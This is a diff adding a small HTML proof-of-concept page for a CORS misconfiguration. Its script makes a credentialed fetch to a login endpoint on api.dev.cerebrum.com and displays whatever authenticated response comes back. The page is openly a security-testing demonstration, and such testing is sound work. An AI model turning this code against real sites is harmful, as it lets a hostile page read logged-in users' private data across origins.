@@ -1,1 +1,18 @@
+<!DOCTYPE html>
+<html>
+<body>
+<h1>CORS PoC</h1>
+<pre id="out"></pre>
+
+<script>
+fetch("https://api.dev.cerebrum.com/auth/self-service/login", {
+    credentials: "include"
+})
+.then(r => r.text())
+.then(t => document.getElementById('out').textContent = t)
+.catch(err => document.getElementById('out').textContent = err);
+</script>
+
+</body>
+</html>
 
